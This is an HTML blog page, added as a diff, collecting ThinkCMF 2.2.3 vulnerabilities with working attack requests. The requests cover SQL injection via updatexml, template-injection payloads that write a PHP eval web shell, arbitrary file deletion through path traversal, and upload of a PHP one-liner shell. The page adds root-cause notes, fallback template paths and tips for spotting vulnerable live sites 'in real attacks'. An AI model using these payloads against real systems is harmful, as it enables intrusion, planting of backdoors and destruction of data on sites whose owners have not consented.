@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="ThinkCMF 2.2.3 漏洞合集一、漏洞简介二、漏洞影响ThinkCMF 2.x 三、复现过程0x01 前台用户文章编辑提交存在注入0x01.1 漏洞演示前台的文章编辑中操作框架注入，所以可以直接sql注入 url:http:&#x2F;&#x2F;thinkcmf.test&#x2F;index.php?g&#x3D;Portal&amp;m&#x3D;Article&amp;a&#x3D;edit_post post: term:123 post">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/ThinkCMF/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="ThinkCMF 2.2.3 漏洞合集一、漏洞简介二、漏洞影响ThinkCMF 2.x 三、复现过程0x01 前台用户文章编辑提交存在注入0x01.1 漏洞演示前台的文章编辑中操作框架注入，所以可以直接sql注入 url:http:&#x2F;&#x2F;thinkcmf.test&#x2F;index.php?g&#x3D;Portal&amp;m&#x3D;Article&amp;a&#x3D;edit_post post: term:123 post">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId28.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId32.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId33.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId36.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId39.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId40.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId42.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId43.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId46.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId47.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId49.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId51.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId52.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId53.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId54.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId55.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId56.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId57.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId58.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId59.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId60.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId61.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId62.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId65.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId67.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId69.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId70.jpg">
+<meta property="article:published_time" content="2022-07-08T06:26:04.272Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.403Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId26.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-ThinkCMF/THINKCMFX_2.2.3漏洞合集" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/ThinkCMF/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.272Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ThinkCMF-2-2-3-漏洞合集"><a href="#ThinkCMF-2-2-3-漏洞合集" class="headerlink" title="ThinkCMF 2.2.3 漏洞合集"></a>ThinkCMF 2.2.3 漏洞合集</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ThinkCMF 2.x</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="0x01-前台用户文章编辑提交存在注入"><a href="#0x01-前台用户文章编辑提交存在注入" class="headerlink" title="0x01 前台用户文章编辑提交存在注入"></a>0x01 前台用户文章编辑提交存在注入</h3><h4 id="0x01-1-漏洞演示"><a href="#0x01-1-漏洞演示" class="headerlink" title="0x01.1 漏洞演示"></a>0x01.1 漏洞演示</h4><pre><code>前台的文章编辑中操作框架注入，所以可以直接sql注入
+url:http://thinkcmf.test/index.php?g=Portal&amp;m=Article&amp;a=edit_post
+post:
+term:123
+post[post_title]:123
+post[post_title]:aaa
+post_title:123
+post[id][0]:bind
+post[id][1]:0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))
+</code></pre>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId26.png"></p>
+<h4 id="0x01-2-漏洞原理"><a href="#0x01-2-漏洞原理" class="headerlink" title="0x01.2 漏洞原理"></a>0x01.2 漏洞原理</h4><p>文件：ThinkCMFX_2.2.3\application\Portal\Controller\ArticleController.class.php<br>方法：public function edit_post(</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId28.jpg"></p>
+<p>这里不多讲，因为没得意义。详情请看先知的历史tp漏洞，谢谢：)</p>
+<h4 id="0x02-前台模版注入漏洞-可getshell两处"><a href="#0x02-前台模版注入漏洞-可getshell两处" class="headerlink" title="0x02 前台模版注入漏洞-可getshell两处"></a>0x02 前台模版注入漏洞-可getshell两处</h4><h5 id="0x02-1-Comment类模版引擎注入演示"><a href="#0x02-1-Comment类模版引擎注入演示" class="headerlink" title="0x02.1 Comment类模版引擎注入演示"></a>0x02.1 Comment类模版引擎注入演示</h5><pre><code>url:http://thinkcmf.test/index.php?g=Comment&amp;m=Widget&amp;a=fetch
+post:
+templateFile=/../public/index
+prefix=&#39;&#39;
+content=&lt;php&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php eval($_REQUEST[11]);&#39;)&lt;/php&gt;
+</code></pre>
+<p>发送之后页面http状态会为200，这样就表示成功了 简单讲解一下：content<br>我输入了php代码所以他会在本地跟路径创建一个一句话木马test.php<br>所以实战过程中。</p>
+<p>连接马子：<a target="_blank" rel="noopener" href="http://xxxxx.com/test.php">http://xxxxx.com/test.php</a> 密码:11 即可getshell</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId32.jpg"></p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId33.jpg"></p>
+<h4 id="0x02-2-Api类模版注入1"><a href="#0x02-2-Api类模版注入1" class="headerlink" title="0x02.2 Api类模版注入1"></a>0x02.2 Api类模版注入1</h4><pre><code>url:http://thinkcmf.test/index.php?g=Api&amp;m=Plugin&amp;a=fetch
+post:
+templateFile=/../../../public/index
+prefix=&#39;&#39;
+content=&lt;php&gt;file_put_contents(&#39;test1.php&#39;,&#39;&lt;?php eval($_REQUEST[11]);&#39;)&lt;/php&gt;
+</code></pre>
+<p>同上一样，会在跟目录生成 马子 test1.php</p>
+<h4 id="0x02-3-漏洞原理"><a href="#0x02-3-漏洞原理" class="headerlink" title="0x02.3 漏洞原理"></a>0x02.3 漏洞原理</h4><p>路径:ThinkCMFX\application\Comment\Controller\WidgetController.class.php<br>路径:ThinkCMFX\application\Api\Controller\PluginController.class.php</p>
+<p>两处的漏洞原理都是一样的，所以我就选一处进行讲解了<br>路径:application\Comment\Controller\WidgetController.class.php<br>方法：public function fetch()</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId36.jpg"></p>
+<p>从名字查看我们会发现他的3个参数</p>
+<p>$templateFile=模版地址 $content=内容 $prefix=前缀</p>
+<p>$templateFile就是我们要包含的文件了，我们必须包含一个不然，代码会报错，导致无法写shell<br>$content 我们写马子的地方 $prefix 忽略他即可，没有用的</p>
+<p>在代码中我们看到一个 $templateFile<br>给parseTemplate函数包含了，这里我们也不用管他，因为他的作用就是判断一下文件是否存在而已，所以我们在实战的时候，可以找到一处html文件包含即可</p>
+<p>而tp的模版引擎 使用的是 smarty 而smarty中只要可控制内容的key 与 value<br>即可写入shell命令，所以同理可得，tp的 $content 我们可控 = 有模版注入</p>
+<h4 id="0x03-任意文件删除-只能windows删除"><a href="#0x03-任意文件删除-只能windows删除" class="headerlink" title="0x03 任意文件删除-只能windows删除"></a>0x03 任意文件删除-只能windows删除</h4><h5 id="0x03-1-漏洞演示"><a href="#0x03-1-漏洞演示" class="headerlink" title="0x03.1 漏洞演示"></a>0x03.1 漏洞演示</h5><p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId39.jpg"></p>
+<pre><code>url：http://thinkcmf.test/index.php?g=User&amp;m=Profile&amp;a=do_avatar
+post:
+mgurl=..\..\..\..\..\1.txt
+</code></pre>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId40.jpg"></p>
+<h4 id="0x03-2-漏洞原理"><a href="#0x03-2-漏洞原理" class="headerlink" title="0x03.2 漏洞原理"></a>0x03.2 漏洞原理</h4><p>路径：ThinkCMFX\application\User\Controller\ProfileController.class.php<br>方法：blic function do_avatar(</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId42.jpg"></p>
+<p>从文件可以看到 $imgurl=str_replace(&#39;/&#39;,&#39;&#39;,$imgurl); 过滤了 /<br>但是没有过滤 所以我们无法引入 / 并且在更新头像以后还会从前端接收参数<br>imgurl 带入函数sp_delete_avatar 跟进去</p>
+<p>路径：ThinkCMFX\application\Common\Common\function.php<br>方法：function sp_delete_avatar(</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId43.jpg"></p>
+<h4 id="0x04-前台任意上传漏洞"><a href="#0x04-前台任意上传漏洞" class="headerlink" title="0x04 前台任意上传漏洞"></a>0x04 前台任意上传漏洞</h4><h5 id="0x04-1-漏洞演示"><a href="#0x04-1-漏洞演示" class="headerlink" title="0x04.1 漏洞演示"></a>0x04.1 漏洞演示</h5><p>记得一定要登录! 记得一定要登录! 记得一定要登录!<br>记得在前台注册一个账号进行登录或是直接登录后台然后在访问此地址</p>
+<pre><code>打开url: http://atest.test/cms/ThinkCMFX_2.2.3/index.php?g=Asset&amp;m=Ueditor&amp;a=upload&amp;action=uploadfile
+POST:
+file = php一句话木马的文件
+
+1.php
+&lt;?php
+eval($_REQUEST[1]); 
+?&gt;
+</code></pre>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId46.png"></p>
+<pre><code>shell地址: http://atest.test/cms/ThinkCMFX_2.2.3/data/upload/ueditor/20190724/5d3833dcce7e3.php?1=phpinfo();
+</code></pre>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId47.png"></p>
+<h5 id="0x04-2-为什么要登录"><a href="#0x04-2-为什么要登录" class="headerlink" title="0x04.2 为什么要登录"></a>0x04.2 为什么要登录</h5><p>路径：ThinkCMFX\application\Asset\Controller\UeditorController.class.php<br>方法：public function _initialize()</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId49.png"></p>
+<h5 id="0x04-3-漏洞原理"><a href="#0x04-3-漏洞原理" class="headerlink" title="0x04.3 漏洞原理"></a>0x04.3 漏洞原理</h5><p>路径：ThinkCMFX\application\Asset\Controller\UeditorController.class.php<br>方法：public function upload(</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId51.png"></p>
+<p>路径：ThinkCMFX\application\Asset\Controller\UeditorController.class.php<br>方法：private function _ueditor_upload</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId52.png"></p>
+<p>该方法使用 $upload_setting=sp_get_upload_setting();<br>先获取所有上传的配置</p>
+<p>在用 $allowed_exts=explode(&#39;,&#39;, $upload_setting[$filetype]);<br>来获取允许上传的后缀</p>
+<p>这里我们先跟进去查看 sp_get_upload_setting(); 函数<br>路径：application\Common\Common\function.php 方法：function<br>sp_get_upload_setting()</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId53.png"></p>
+<p>接下来我们需要重点查看一下：$upload_setting[$filetype]<br>我们可以打印一下,看看他的返回值 路径:<br>application\Asset\Controller\UeditorController.class.php 方法:<br>private function _ueditor_upload( 代码:<br>$upload_setting[$filetype]</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId54.png"></p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId55.png"></p>
+<p>然后我们在看看他的代码 $allowed_exts=explode(&#39;,&#39;,<br>$upload_setting[$filetype]); 路径:<br>application\Asset\Controller\UeditorController.class.php 方法:<br>private function _ueditor_upload( 代码: $allowed_exts=explode(&#39;,&#39;,<br>$upload_setting[$filetype]); $upload_setting[$filetype]<br>执行以后返回的结果是数组并且为2:</p>
+<pre><code>array(2) &#123;
+  [&quot;upload_max_filesize&quot;]=&gt;
+  string(5) &quot;10240&quot;
+  [&quot;extensions&quot;]=&gt;
+  string(42) &quot;txt,pdf,doc,docx,xls,xlsx,ppt,pptx,zip,rar&quot;
+&#125;
+</code></pre>
+<p>而这里用了php函数: explode 让我们看看这个函数的作用</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId56.png"></p>
+<p>把字符串转成数组,可是他返回的就是数组所以 $allowed_exts=explode(&#39;,&#39;,<br>$upload_setting[$filetype]); 执行返回空 让我们测试一下看看</p>
+<p>路径: application\Asset\Controller\UeditorController.class.php 方法:<br>private function _ueditor_upload()</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId57.png"></p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId58.png"></p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId59.png"></p>
+<p>跟进去tp的上传方法查看一下<br>路径：ThinkCMFX_2.2.3\simplewind\Core\Library\Think\Upload.class.php<br>方法：public function upload()</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId60.png"></p>
+<p>路径：ThinkCMFX_2.2.3\simplewind\Core\Library\Think\Upload.class.php<br>方法：private function check()</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId61.png"></p>
+<p>路径：ThinkCMFX_2.2.3\simplewind\Core\Library\Think\Upload.class.php<br>方法：private function checkExt()</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId62.png"></p>
+<p>因为这里返回了true所以实际上他并没有验证后缀<br>所以我们也就多了一个任意文件上传漏洞</p>
+<h4 id="0x05-使用说明"><a href="#0x05-使用说明" class="headerlink" title="0x05 使用说明"></a>0x05 使用说明</h4><p>前面说了，thinkcmf<br>并没有死，并且有3版本与5版本这里提供一些方法，帮助你们辨别哪一些是可以日的，那一些事不行的。</p>
+<h5 id="1，看logo-3的logo是黄色的例如下图"><a href="#1，看logo-3的logo是黄色的例如下图" class="headerlink" title="1，看logo 3的logo是黄色的例如下图"></a>1，看logo 3的logo是黄色的例如下图</h5><p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId65.jpg"></p>
+<h5 id="2，在网站url-后面输入-admin"><a href="#2，在网站url-后面输入-admin" class="headerlink" title="2，在网站url 后面输入 admin"></a>2，在网站url 后面输入 admin</h5><p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId67.png"></p>
+<p>如果页面是蓝色的表示是3的，可日穿之</p>
+<h5 id="3，查看-README-md"><a href="#3，查看-README-md" class="headerlink" title="3，查看 README.md"></a>3，查看 README.md</h5><p>在网站url后面输入README.md</p>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId69.jpg"></p>
+<p>另外还有一个说明，你在实际操作的过程中，可能会遇到他一直报这个错</p>
+<pre><code>url:http://thinkcmf.test/index.php?g=Comment&amp;m=Widget&amp;a=fetch
+post:
+templateFile=/../public/index
+prefix=&#39;&#39;
+content=&lt;php&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php eval($_REQUEST[11]);&#39;)&lt;/php&gt;
+</code></pre>
+<p><img src="/resource/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/media/rId70.jpg"></p>
+<p>请放心这并不是说明漏洞不可使用，而是说，这个模版不存在，你可以换一个html即可</p>
+<pre><code>例如：
+/../public/index
+/../public/exception
+/../data/index
+/../data/runtime/index
+/../plugins/Mobileverify/View/admin_index
+/../plugins/Mobileverify/View/index
+/../plugins/Mobileverify/View/widget
+/../plugins/Demo/View/admin_index
+/../plugins/Demo/View/index
+/../plugins/Demo/View/widget
+/../application/Install/View/Public/footer
+/../application/Install/View/Public/head
+/../application/Install/View/Public/header
+/../application/Common/index
+/../application/Portal/Lang/en-us/index
+/../application/Api/Lang/en-us/index
+/../application/Api/Lang/zh-cn/index
+/../application/Comment/Lang/en-us/index
+/../application/Comment/Lang/zh-cn/index
+url:http://thinkcmf.test/index.php?g=Api&amp;m=Plugin&amp;a=fetch
+post:
+templateFile=/../../../public/index
+prefix=&#39;&#39;
+content=&lt;php&gt;file_put_contents(&#39;test1.php&#39;,&#39;&lt;?php eval($_REQUEST[11]);&#39;)&lt;/php&gt;
+/../../../public/index
+/../../../public/exception
+/../../../data/index
+/../../../data/runtime/index
+/../../../plugins/Mobileverify/View/admin_index
+/../../../plugins/Mobileverify/View/index
+/../../../plugins/Mobileverify/View/widget
+/../../../plugins/Demo/View/admin_index
+/../../../plugins/Demo/View/index
+/../../../plugins/Demo/View/widget
+/../../../application/Install/View/Public/footer
+/../../../application/Install/View/Public/head
+/../../../application/Install/View/Public/header
+/../../../application/Common/index
+/../../../application/Portal/Lang/en-us/index
+/../../../application/Api/Lang/en-us/index
+/../../../application/Api/Lang/zh-cn/index
+/../../../application/Comment/Lang/en-us/index
+/../../../application/Comment/Lang/zh-cn/index
+</code></pre>
+<p>还有最后一句废话：模版注入对于linux 并不好用 : )<br>差不多了，剩下的自己去thinkcmf里面自己找</p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p>文章来源于<a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/aiiak1">https://www.yuque.com/pmiaowu/bfgkkh/aiiak1</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/ThinkCMF/THINKCMFX_2.2.3%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" data-id="cl5c2qw2v00hfy8v1dy3rbtoi" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/ThinkCMF/%EF%BC%88CVE-2019-7580%EF%BC%89ThinkCMF%205.0.190111%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/ThinkCMF/ThinkCMF%20%E7%BC%93%E5%AD%98Getshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
